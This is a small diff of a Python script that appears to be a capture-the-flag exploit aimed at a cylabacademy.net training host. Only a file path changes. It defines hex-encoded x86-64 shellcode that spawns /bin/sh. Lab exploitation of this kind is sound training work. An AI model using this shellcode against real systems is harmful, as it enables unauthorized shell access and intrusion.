@@ -1,6 +1,6 @@
 import sys, re, time, socket, struct
 sys.stdout.reconfigure(encoding="utf-8", errors="replace")
-HOST = open(r"D:\ctf-index\_z_126url.txt").read().split() if False else ("chatelaine.cylabacademy.net", 17776)
+HOST = open(r"./_z_126url.txt").read().split() if False else ("chatelaine.cylabacademy.net", 17776)
 host, port = HOST
 print("cible:", host, port)
 SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
